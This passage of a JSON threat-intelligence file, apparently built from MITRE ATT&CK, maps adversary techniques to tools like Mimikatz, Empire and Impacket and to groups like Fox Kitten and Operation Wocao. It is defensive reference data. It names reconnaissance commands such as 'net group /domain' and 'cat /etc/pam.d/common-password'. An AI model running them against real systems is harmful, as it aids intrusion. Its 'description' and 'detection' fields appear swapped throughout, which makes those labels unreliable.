                "detection": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Scanning or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB  and RDP  as well as applications that may be used within internal networks such as MySQL  and web server services. \n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1217",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Browser Bookmark Discovery",
                "chain_phase": "discovery",
                "description": "Monitor processes and command-line arguments for actions that could be taken to gather browser bookmark information. Remote access tools with built-in features may interact directly using APIs to gather information. Information may also be acquired through system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.",
                "detection": "Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.\n\nBrowser bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially Credentials In Files associated with logins cached by a browser.\n\nSpecific storage locations vary based on platform and/or application, but browser bookmarks are typically stored in local files/databases.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1134",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Access Token Manipulation",
                "chain_phase": "defense-evasion",
                "description": "If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior. \n\nThere are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., <code>LogonUser</code> (Citation: Microsoft LogonUser), <code>DuplicateTokenEx</code>(Citation: Microsoft DuplicateTokenEx), and <code>ImpersonateLoggedOnUser</code>(Citation: Microsoft ImpersonateLoggedOnUser)). Please see the referenced Windows API pages for more information.\n\nQuery systems for process and thread token information and look for inconsistencies such as user owns processes impersonating the local SYSTEM account.(Citation: BlackHat Atkinson Winchester Token Manipulation)\n\nLook for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.",
                "detection": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\n\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.\n\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1125",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Video Capture",
                "chain_phase": "collection",
                "description": "Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.\n\nBehavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the video camera, recording devices, or recording software, and a process periodically writing files to disk that contain video or camera image data.",
                "detection": "An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from Screen Capture due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "S0363",
            "type": "tool",
            "attributes": {
                "name": "Empire",
                "aliases": [
                    "EmPyre",
                    "PowerShell Empire"
                ],
                "labels": [
                    "tool"
                ],
                "description": "Empire is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure PowerShell for Windows and Python for Linux/macOS. Empire was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "techniques": {
                    "T1484.001": "Group Policy Modification",
                    "T1127.001": "MSBuild",
                    "T1573.002": "Asymmetric Cryptography",
                    "T1574.004": "Dylib Hijacking",
                    "T1071.001": "Web Protocols",
                    "T1102.002": "Bidirectional Communication",
                    "T1574.001": "DLL Search Order Hijacking",
                    "T1574.008": "Path Interception by Search Order Hijacking",
                    "T1574.007": "Path Interception by PATH Environment Variable",
                    "T1574.009": "Path Interception by Unquoted Path",
                    "T1569.002": "Service Execution",
                    "T1567.002": "Exfiltration to Cloud Storage",
                    "T1567.001": "Exfiltration to Code Repository",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1518.001": "Security Software Discovery",
                    "T1087.002": "Domain Account",
                    "T1087.001": "Local Account",
                    "T1560": "Archive Collected Data",
                    "T1114.001": "Local Email Collection",
                    "T1134.005": "SID-History Injection",
                    "T1134.002": "Create Process with Token",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1558.002": "Silver Ticket",
                    "T1558.001": "Golden Ticket",
                    "T1557.001": "LLMNR/NBT-NS Poisoning and SMB Relay",
                    "T1056.004": "Credential API Hooking",
                    "T1056.001": "Keylogging",
                    "T1558.003": "Kerberoasting",
                    "T1003.001": "LSASS Memory",
                    "T1021.004": "SSH",
                    "T1021.003": "Distributed Component Object Model",
                    "T1552.004": "Private Keys",
                    "T1552.001": "Credentials In Files",
                    "T1070.006": "Timestomp",
                    "T1550.002": "Pass the Hash",
                    "T1548.002": "Bypass User Account Control",
                    "T1136.002": "Domain Account",
                    "T1136.001": "Local Account",
                    "T1547.009": "Shortcut Modification",
                    "T1547.005": "Security Support Provider",
                    "T1546.008": "Accessibility Features",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1053.005": "Scheduled Task",
                    "T1482": "Domain Trust Discovery",
                    "T1210": "Exploitation of Remote Services",
                    "T1217": "Browser Bookmark Discovery",
                    "T1134": "Access Token Manipulation",
                    "T1135": "Network Share Discovery",
                    "T1125": "Video Capture",
                    "T1115": "Clipboard Data",
                    "T1113": "Screen Capture",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1068": "Exploitation for Privilege Escalation",
                    "T1059": "Command and Scripting Interpreter",
                    "T1057": "Process Discovery",
                    "T1055": "Process Injection",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1046": "Network Service Scanning",
                    "T1043": "Commonly Used Port",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1040": "Network Sniffing",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 69
        },
        {
            "id": "T1003.006",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "DCSync",
                "chain_phase": "credential-access",
                "description": "Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync.(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Also monitor for network protocols(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests(Citation: Microsoft SAMR) from IPs not associated with known domain controllers.(Citation: AdSecurity DCSync Sept 2015)\n\nNote: Domain controllers may not log replication requests originating from the default domain controller account.(Citation: Harmj0y DCSync Sept 2015)",
                "detection": "Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)    to simulate the replication process from a remote domain controller using a technique called DCSync.\n\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in Pass the Ticket or change an account's password as noted in Account Manipulation.\n\nDCSync functionality has been included in the \"lsadump\" module in Mimikatz. Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1550.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Pass the Ticket",
                "chain_phase": "defense-evasion",
                "description": "Audit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.\n\nEvent ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to \"Integrity check on decrypted field failed\" and indicates misuse by a previously invalidated golden ticket.(Citation: CERT-EU Golden Ticket Protection)",
                "detection": "Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\n\nWhen preforming PtT, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.\n\nA Silver Ticket can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).\n\nA Golden Ticket can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.\n\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. Pass the Hash) while also using the password hash to create a valid Kerberos ticket.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1207",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Rogue Domain Controller",
                "chain_phase": "defense-evasion",
                "description": "Monitor and analyze network traffic associated with data replication (such as calls to DrsAddEntry, DrsReplicaAdd, and especially GetNCChanges) between DCs as well as to/from non DC hosts. (Citation: GitHub DCSYNCMonitor) (Citation: DCShadow Blog) DC replication will naturally take place every 15 minutes but can be triggered by an attacker or by legitimate urgent changes (ex: passwords). Also consider monitoring and alerting on the replication of AD objects (Audit Detailed Directory Service Replication Events 4928 and 4929). (Citation: DCShadow Blog)\n\nLeverage AD directory synchronization (DirSync) to monitor changes to directory state using AD replication cookies. (Citation: Microsoft DirSync) (Citation: ADDSecurity DCShadow Feb 2018)\n\nBaseline and periodically analyze the Configuration partition of the AD schema and alert on creation of nTDSDSA objects. (Citation: DCShadow Blog)\n\nInvestigate usage of Kerberos Service Principal Names (SPNs), especially those associated with services (beginning with “GC/”) by computers not present in the DC organizational unit (OU). The SPN associated with the Directory Replication Service (DRS) Remote Protocol interface (GUID E3514235–4B06–11D1-AB04–00C04FC2DCD2) can be set without logging. (Citation: ADDSecurity DCShadow Feb 2018) A rogue DC must authenticate as a service using these two SPNs for the replication process to successfully complete.",
                "detection": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC.  Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. \n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors).  The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform SID-History Injection and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1098",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Account Manipulation",
                "chain_phase": "persistence",
                "description": "Collect events that correlate with changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728 and 4670.(Citation: Microsoft User Modified Event)(Citation: Microsoft Security Event 4670)(Citation: Microsoft Security Event 4670) Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Especially flag events where the subject and target accounts differ(Citation: InsiderThreat ChangeNTLM July 2017) or that include additional flags such as changing a password without knowledge of the old password.(Citation: GitHub Mimikatz Issue 92 June 2017)\n\nMonitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.\n\nMonitor for unusual permissions changes that may indicate excessively broad permissions being granted to compromised accounts.",
                "detection": "Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace"
                ]
            }
        },
        {
            "id": "S0002",
            "type": "tool",
            "attributes": {
                "name": "Mimikatz",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Mimikatz is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1555.004": "Windows Credential Manager",
                    "T1003.004": "LSA Secrets",
                    "T1134.005": "SID-History Injection",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1558.002": "Silver Ticket",
                    "T1558.001": "Golden Ticket",
                    "T1555": "Credentials from Password Stores",
                    "T1003.006": "DCSync",
                    "T1003.002": "Security Account Manager",
                    "T1003.001": "LSASS Memory",
                    "T1552.004": "Private Keys",
                    "T1550.003": "Pass the Ticket",
                    "T1550.002": "Pass the Hash",
                    "T1547.005": "Security Support Provider",
                    "T1207": "Rogue Domain Controller",
                    "T1098": "Account Manipulation"
                }
            },
            "val": 16
        },
        {
            "id": "G0117",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "Fox Kitten",
                "aliases": [
                    "UNC757",
                    "PIONEER KITTEN",
                    "Parisite"
                ],
                "description": "Fox Kitten is threat actor with a suspected nexus to the Iranian government that has been active since at least 2017 against entities in the Middle East, North Africa, Europe, Australia, and North America. Fox Kitten has targeted multiple industrial verticals including oil and gas, technology, government, defense, healthcare, manufacturing, and engineering.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0556": "Pay2Key",
                    "S0508": "Ngrok",
                    "S0029": "PsExec",
                    "S0020": "China Chopper"
                },
                "techniques": {
                    "T1555.005": "Password Managers",
                    "T1585.001": "Social Media Accounts",
                    "T1585": "Establish Accounts",
                    "T1572": "Protocol Tunneling",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1087.002": "Domain Account",
                    "T1087.001": "Local Account",
                    "T1560.001": "Archive via Utility",
                    "T1003.003": "NTDS",
                    "T1003.001": "LSASS Memory",
                    "T1021.005": "VNC",
                    "T1021.004": "SSH",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1036.004": "Masquerade Task or Service",
                    "T1552.001": "Credentials In Files",
                    "T1136.001": "Local Account",
                    "T1546.008": "Accessibility Features",
                    "T1505.003": "Web Shell",
                    "T1053.005": "Scheduled Task",
                    "T1530": "Data from Cloud Storage Object",
                    "T1190": "Exploit Public-Facing Application",
                    "T1210": "Exploitation of Remote Services",
                    "T1217": "Browser Bookmark Discovery",
                    "T1213": "Data from Information Repositories",
                    "T1110": "Brute Force",
                    "T1105": "Ingress Tool Transfer",
                    "T1102": "Web Service",
                    "T1090": "Proxy",
                    "T1083": "File and Directory Discovery",
                    "T1078": "Valid Accounts",
                    "T1059": "Command and Scripting Interpreter",
                    "T1046": "Network Service Scanning",
                    "T1039": "Data from Network Shared Drive",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery",
                    "T1012": "Query Registry",
                    "T1005": "Data from Local System"
                }
            }
        },
        {
            "id": "T1489",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Service Stop",
                "chain_phase": "impact",
                "description": "Monitor processes and command-line arguments to see if critical processes are terminated or stop running.\n\nMonitor for edits for modifications to services and startup programs that correspond to services of high importance. Look for changes to services that do not correlate with known software, patch cycles, etc. Windows service information is stored in the Registry at <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. Systemd service unit files are stored within the /etc/systemd/system, /usr/lib/systemd/system/, and /home/.config/systemd/user/ directories, as well as associated symbolic links.\n\nAlterations to the service binary path or the service startup type changed to disabled may be suspicious.\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. For example, <code>ChangeServiceConfigW</code> may be used by an adversary to prevent services from starting.(Citation: Talos Olympic Destroyer 2018)",
                "detection": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible . In some cases, adversaries may stop or disable many or all services to render systems unusable. Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "S0556",
            "type": "tool",
            "attributes": {
                "name": "Pay2Key",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Pay2Key is a ransomware written in C++ that has been used by Fox Kitten since at least July 2020 including campaigns against Israeli companies. Pay2Key has been incorporated with a leak site to display stolen sensitive information to further pressure victims into payment.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1090.001": "Internal Proxy",
                    "T1070.004": "File Deletion",
                    "T1489": "Service Stop",
                    "T1486": "Data Encrypted for Impact",
                    "T1095": "Non-Application Layer Protocol",
                    "T1082": "System Information Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 8
        },
        {
            "id": "T1567",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Exfiltration Over Web Service",
                "chain_phase": "exfiltration",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.",
                "detection": "Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.\n\nWeb service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1102",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Web Service",
                "chain_phase": "command-and-control",
                "description": "Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0508",
            "type": "tool",
            "attributes": {
                "name": "Ngrok",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Ngrok is a legitimate reverse proxy tool that can create a secure tunnel to servers located behind firewalls or on local machines that do not have a public IP. Ngrok has been leveraged by threat actors in several campaigns including use for lateral movement and data exfiltration.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1572": "Protocol Tunneling",
                    "T1568.002": "Domain Generation Algorithms",
                    "T1567": "Exfiltration Over Web Service",
                    "T1102": "Web Service",
                    "T1090": "Proxy"
                }
            },
            "val": 5
        },
        {
            "id": "G0116",
            "type": "group",
            "attributes": {
                "val": 6,
                "name": "Operation Wocao",
                "aliases": [],
                "description": "Operation Wocao described activities carried out by a China-based cyber espionage adversary. Operation Wocao targeted entities within the government, managed service providers, energy, health care, and technology sectors across several countries, including China, France, Germany, the United Kingdom, and the United States. Operation Wocao used similar TTPs and tools to APT20, suggesting a possible overlap.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0521": "BloodHound",
                    "S0357": "Impacket",
                    "S0194": "PowerSploit",
                    "S0105": "dsquery",
                    "S0104": "netstat",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1555.005": "Password Managers",
                    "T1027.005": "Indicator Removal from Tools",
                    "T1573.002": "Asymmetric Cryptography",
                    "T1090.003": "Multi-hop Proxy",
                    "T1090.001": "Internal Proxy",
                    "T1074.001": "Local Data Staging",
                    "T1078.003": "Local Accounts",
                    "T1078.002": "Domain Accounts",
                    "T1069.001": "Local Groups",
                    "T1570": "Lateral Tool Transfer",
                    "T1569.002": "Service Execution",
                    "T1059.006": "Python",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1518.001": "Security Software Discovery",
                    "T1087.002": "Domain Account",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1560.001": "Archive via Utility",
                    "T1056.001": "Keylogging",
                    "T1003.006": "DCSync",
                    "T1558.003": "Kerberoasting",
                    "T1003.001": "LSASS Memory",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1552.004": "Private Keys",
                    "T1070.004": "File Deletion",
                    "T1070.001": "Clear Windows Event Logs",
                    "T1505.003": "Web Shell",
                    "T1053.005": "Scheduled Task",
                    "T1518": "Software Discovery",
                    "T1190": "Exploit Public-Facing Application",
                    "T1135": "Network Share Discovery",
                    "T1133": "External Remote Services",
                    "T1124": "System Time Discovery",
                    "T1120": "Peripheral Device Discovery",
                    "T1119": "Automated Collection",
                    "T1115": "Clipboard Data",
                    "T1112": "Modify Registry",
                    "T1111": "Two-Factor Authentication Interception",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1095": "Non-Application Layer Protocol",
                    "T1090": "Proxy",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1078": "Valid Accounts",
                    "T1057": "Process Discovery",
                    "T1055": "Process Injection",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1046": "Network Service Scanning",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1007": "System Service Discovery",
                    "T1005": "Data from Local System",
                    "T1001": "Data Obfuscation"
                }
            }
        },
        {
            "id": "T1069.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Domain Groups",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as <code>net group /domain</code> of the Net utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1201",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Password Policy Discovery",
                "chain_phase": "discovery",
                "description": "Monitor processes for tools and command line arguments that may indicate they're being used for password policy discovery. Correlate that activity with other suspicious activity from the originating system to reduce potential false positives from valid user or administrator activity. Adversaries will likely attempt to find the password policy early in an operation and the activity is likely to happen with other Discovery activity.",
                "detection": "Adversaries may attempt to access detailed information about the password policy used within an enterprise network. Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through Brute Force. This would help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\n\nPassword policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code>.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "S0521",
            "type": "tool",
            "attributes": {
                "name": "BloodHound",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "BloodHound is an Active Directory (AD) reconnaissance tool that can reveal hidden relationships and identify attack paths within an AD environment.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1069.001": "Local Groups",
                    "T1059.001": "PowerShell",
                    "T1069.002": "Domain Groups",
                    "T1087.002": "Domain Account",
                    "T1087.001": "Local Account",
                    "T1560": "Archive Collected Data",
                    "T1482": "Domain Trust Discovery",
                    "T1201": "Password Policy Discovery",
                    "T1106": "Native API",
                    "T1033": "System Owner/User Discovery",
                    "T1018": "Remote System Discovery"
                }
            },
            "val": 11
        },
        {
            "id": "S0357",
            "type": "tool",
            "attributes": {
                "name": "Impacket",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Impacket is an open source collection of modules written in Python for programmatically constructing and manipulating network protocols. Impacket contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks.",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "techniques": {
                    "T1569.002": "Service Execution",
                    "T1003.004": "LSA Secrets",
                    "T1557.001": "LLMNR/NBT-NS Poisoning and SMB Relay",
                    "T1558.003": "Kerberoasting",
                    "T1003.003": "NTDS",
                    "T1003.002": "Security Account Manager",
                    "T1003.001": "LSASS Memory",
                    "T1047": "Windows Management Instrumentation",
                    "T1040": "Network Sniffing"
                }
            },
            "val": 9
        },
        {
            "id": "T1552.006",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Group Policy Preferences",
                "chain_phase": "credential-access",
                "description": "Monitor for attempts to access SYSVOL that involve searching for XML files. \n\nDeploy a new XML file with permissions set to Everyone:Deny and monitor for Access Denied errors.(Citation: ADSecurity Finding Passwords in SYSVOL)",
